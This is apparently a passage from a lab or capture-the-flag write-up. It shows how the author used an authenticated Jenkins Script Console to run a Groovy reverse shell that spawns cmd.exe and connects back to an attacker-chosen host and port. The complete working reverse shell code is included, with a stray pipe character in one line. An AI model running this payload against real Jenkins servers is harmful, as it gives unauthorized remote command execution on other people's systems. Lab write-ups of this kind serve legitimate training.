
Once logged in we go to `Manage Jetkins` and to `Script Console`: 

![](attachments/Pasted%20image%2020251126221131.png)

In Jenkins, `Groovy` serves as the main scripting language for defining jobs and pipelines. Therefore, we are going to use the Groovy reverse shell script to obtain a reverse shell. So I search for a `Groovy reverse shell` and I find this one:

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";|Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

I changed the `host` and I copy pasted the reverse shell into the console and I clicked the `Run` button:

![](attachments/Pasted%20image%2020251126222136.png)

and I got a shell!!!

